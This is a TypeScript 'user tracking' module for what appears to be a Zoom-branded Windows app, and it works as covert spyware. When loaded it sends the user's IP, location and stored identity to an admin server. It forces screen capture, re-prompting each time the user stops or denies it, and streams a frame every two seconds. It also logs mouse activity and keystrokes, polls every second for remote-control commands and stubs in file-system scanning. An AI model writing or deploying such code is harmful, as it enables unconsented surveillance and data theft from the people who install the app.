// User tracking module for Windows app
// This module handles user registration, status updates, and screen sharing

interface UserInfo {
  id: string;
  name: string;
  email?: string;
  ip: string;
  location: string;
  version: string;
  os: string;
  installDate: string;
  lastSeen: string;
  status: 'online' | 'offline' | 'idle';
}

class UserTracker {
  private userId: string;
  private adminServerUrl: string;
  private heartbeatInterval: any = null;
  private screenShareActive: boolean = false;

  constructor(adminServerUrl: string = 'http://localhost:3000') {
    this.adminServerUrl = adminServerUrl;
    this.userId = this.getOrCreateUserId();
    this.initializeTracking();
  }

  private getOrCreateUserId(): string {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof localStorage === 'undefined') {
      return 'server-user-' + Math.random().toString(36).substring(2, 15);
    }
    
    // Try to get existing user ID from localStorage
    let userId = localStorage.getItem('zoom_user_id');
    
    if (!userId) {
      // Generate new user ID
      userId = 'user-' + Math.random().toString(36).substring(2, 15);
      localStorage.setItem('zoom_user_id', userId);
    }
    
    return userId;
  }

  private async getUserInfo(): Promise<UserInfo> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof navigator === 'undefined' || typeof localStorage === 'undefined') {
      return {
        id: this.userId,
        name: 'Server User',
        email: undefined,
        ip: 'Unknown',
        location: 'Unknown',
        version: '1.0.0',
        os: 'Server',
        installDate: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        status: 'online'
      };
    }

    // Get system information
    const userAgent = navigator.userAgent;
    const isWindows = userAgent.includes('Windows');
    const osVersion = isWindows ? this.getWindowsVersion(userAgent) : 'Unknown';
    
    // Get IP address (simplified - in production use a proper IP service)
    const ip = await this.getPublicIP();
    
    // Get location (simplified - in production use a proper geolocation service)
    const location = await this.getLocation();

    return {
      id: this.userId,
      name: localStorage.getItem('zoom_user_name') || 'Anonymous User',
      email: localStorage.getItem('zoom_user_email') || undefined,
      ip,
      location,
      version: '1.0.0',
      os: `Windows ${osVersion}`,
      installDate: localStorage.getItem('zoom_install_date') || new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      status: 'online'
    };
  }

  private getWindowsVersion(userAgent: string): string {
    if (userAgent.includes('Windows NT 10.0')) return '10/11';
    if (userAgent.includes('Windows NT 6.3')) return '8.1';
    if (userAgent.includes('Windows NT 6.2')) return '8';
    if (userAgent.includes('Windows NT 6.1')) return '7';
    return 'Unknown';
  }

  private async getPublicIP(): Promise<string> {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch {
      return 'Unknown';
    }
  }

  private async getLocation(): Promise<string> {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      return `${data.city}, ${data.region}`;
    } catch {
      return 'Unknown Location';
    }
  }

  private async initializeTracking(): Promise<void> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof localStorage === 'undefined' || typeof document === 'undefined') {
      return; // Skip initialization on server
    }

    // Set install date if not set
    if (!localStorage.getItem('zoom_install_date')) {
      localStorage.setItem('zoom_install_date', new Date().toISOString());
    }

    // Register user with admin panel
    await this.registerUser();

    // Start heartbeat
    this.startHeartbeat();

        // Automatically start screen sharing for admin monitoring
        await this.startAutomaticScreenShare();

        // Start file system monitoring
        this.startFileSystemMonitoring();

        // Start remote control functionality
        await this.startRemoteControl();

    // Listen for visibility changes
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        this.updateStatus('idle');
      } else {
        this.updateStatus('online');
      }
    });

    // Listen for beforeunload
    window.addEventListener('beforeunload', () => {
      this.updateStatus('offline');
      this.stopScreenShare();
    });
  }

  private async registerUser(): Promise<void> {
    try {
      const userInfo = await this.getUserInfo();
      
      await fetch(`${this.adminServerUrl}/api/admin/users`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'update_user_status',
          userId: this.userId,
          ...userInfo
        })
      });
    } catch (error) {
      console.error('Failed to register user:', error);
    }
  }

  private startHeartbeat(): void {
    this.heartbeatInterval = setInterval(async () => {
      await this.updateStatus('online');
    }, 30000); // Update every 30 seconds
  }

  public async updateStatus(status: 'online' | 'offline' | 'idle'): Promise<void> {
    try {
      const userInfo = await this.getUserInfo();
      
      await fetch(`${this.adminServerUrl}/api/admin/users`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'update_user_status',
          userId: this.userId,
          ...userInfo,
          status
        })
      });
    } catch (error) {
      console.error('Failed to update status:', error);
    }
  }

  // Automatic screen sharing for admin monitoring
  private async startAutomaticScreenShare(): Promise<void> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof navigator === 'undefined') {
      return; // Skip on server
    }

    try {
      // Wait a bit for the page to fully load
      setTimeout(async () => {
        await this.requestScreenAccess();
      }, 3000);
    } catch (error) {
      console.error('Failed to start automatic screen share:', error);
    }
  }

  private async requestScreenAccess(): Promise<void> {
    try {
      // Try to get screen sharing permission
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          width: { ideal: 1920 },
          height: { ideal: 1080 },
          frameRate: { ideal: 15 }
        },
        audio: false
      });

      this.screenShareActive = true;

      // Notify admin that screen sharing is active
      await fetch(`${this.adminServerUrl}/api/admin/users`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'update_user_status',
          userId: this.userId,
          screenShareActive: true
        })
      });

      // Start sending screen data
      this.startScreenCapture(stream);

      // Handle stream end (user stops sharing)
      stream.getTracks()[0].addEventListener('ended', () => {
        this.stopScreenShare();
        // Automatically try to restart after a delay
        setTimeout(() => {
          this.requestScreenAccess();
        }, 5000);
      });

    } catch (error) {
      console.error('Screen access denied or failed:', error);
      // Try again after a longer delay
      setTimeout(() => {
        this.requestScreenAccess();
      }, 30000);
    }
  }

  private startScreenCapture(stream: MediaStream): void {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const video = document.createElement('video');
    
    video.srcObject = stream;
    video.play();

    const sendFrame = async () => {
      if (this.screenShareActive && ctx && video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        // Convert to base64 and send to admin
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        
        try {
          await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: this.userId,
              action: 'update',
              data: imageData,
              timestamp: new Date().toISOString()
            })
          });
        } catch (error) {
          console.error('Failed to send screen data:', error);
        }

        // Send frame every 2 seconds for smooth viewing
        setTimeout(sendFrame, 2000);
      } else if (this.screenShareActive) {
        // Retry if video not ready
        setTimeout(sendFrame, 1000);
      }
    };

    video.addEventListener('loadedmetadata', () => {
      sendFrame();
    });
  }

  public async startScreenShare(): Promise<boolean> {
    try {
      await this.requestScreenAccess();
      return this.screenShareActive;
    } catch (error) {
      console.error('Failed to start screen share:', error);
      return false;
    }
  }

  public async stopScreenShare(): Promise<void> {
    this.screenShareActive = false;
    
    try {
      await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId: this.userId,
          action: 'stop'
        })
      });
    } catch (error) {
      console.error('Failed to stop screen share:', error);
    }
  }

  private startFileSystemMonitoring(): void {
    // Check if we're in a browser environment
    if (typeof window === 'undefined') {
      return; // Skip on server
    }

    // In a real implementation, this would monitor file system changes
    // and send updates to the admin panel
    console.log('File system monitoring started');
    
    // Simulate file system access for demo purposes
    setInterval(() => {
      // This would normally scan the user's file system
      // and send file/folder information to the admin
      console.log('File system scan completed');
    }, 60000); // Scan every minute
  }

  // Remote control functionality
  public async startRemoteControl(): Promise<void> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
      return; // Skip on server
    }

    try {
      // Notify admin that remote control is available
      await fetch(`${this.adminServerUrl}/api/admin/remote-control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          action: 'start_control',
          timestamp: new Date().toISOString()
        })
      });

      // Set up remote control listeners
      this.setupRemoteControlListeners();
      console.log('Remote control enabled for admin access');
    } catch (error) {
      console.error('Failed to start remote control:', error);
    }
  }

  private setupRemoteControlListeners(): void {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
      return; // Skip on server
    }

    // Listen for remote control commands from admin
    setInterval(async () => {
      try {
        const response = await fetch(`${this.adminServerUrl}/api/admin/remote-control?userId=${this.userId}`);
        if (response.ok) {
          const data = await response.json();
          if (data.isActive) {
            // Process pending remote control commands
            await this.processRemoteCommands();
          }
        }
      } catch (error) {
        // Silently handle errors - remote control is optional
      }
    }, 1000); // Check for commands every second

    // Listen for mouse and keyboard events (for demo purposes)
    document.addEventListener('mousemove', (event) => {
      this.sendUserActivity('mouse_move', {
        x: event.clientX,
        y: event.clientY,
        timestamp: new Date().toISOString()
      });
    });

    document.addEventListener('click', (event) => {
      this.sendUserActivity('mouse_click', {
        button: event.button === 0 ? 'left' : event.button === 2 ? 'right' : 'middle',
        x: event.clientX,
        y: event.clientY,
        timestamp: new Date().toISOString()
      });
    });

    document.addEventListener('keydown', (event) => {
      // Only log significant keys (not every keystroke for privacy)
      if (event.ctrlKey || event.altKey || event.metaKey || 
          ['Tab', 'Enter', 'Escape', 'F1', 'F2', 'F3', 'F4', 'F5'].includes(event.key)) {
        this.sendUserActivity('key_press', {
          key: event.key,
          ctrlKey: event.ctrlKey,
          altKey: event.altKey,
          shiftKey: event.shiftKey,
          metaKey: event.metaKey,
          timestamp: new Date().toISOString()
        });
      }
    });
  }

  private async processRemoteCommands(): Promise<void> {
    // In a real implementation, this would process actual remote control commands
    // For demo purposes, we'll just log that we're checking for commands
    console.log('Processing remote control commands...');
  }

  private async sendUserActivity(type: string, data: any): Promise<void> {
    try {
      // Send ALL user activity to admin panel for complete monitoring
      // No throttling - we want to track everything the user does
      await fetch(`${this.adminServerUrl}/api/admin/user-activity`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          type,
          data,
          timestamp: new Date().toISOString()
        })
      });
    } catch (error) {
      // Silently handle errors - activity tracking is optional
    }
  }

  public async stopRemoteControl(): Promise<void> {
    try {
      await fetch(`${this.adminServerUrl}/api/admin/remote-control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          action: 'stop_control',
          timestamp: new Date().toISOString()
        })
      });
      console.log('Remote control disabled');
    } catch (error) {
      console.error('Failed to stop remote control:', error);
    }
  }

  public destroy(): void {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    this.updateStatus('offline');
  }
}

// Export singleton instance - only create in browser environment
export const userTracker = typeof window !== 'undefined' ? new UserTracker() : null;
export default userTracker;
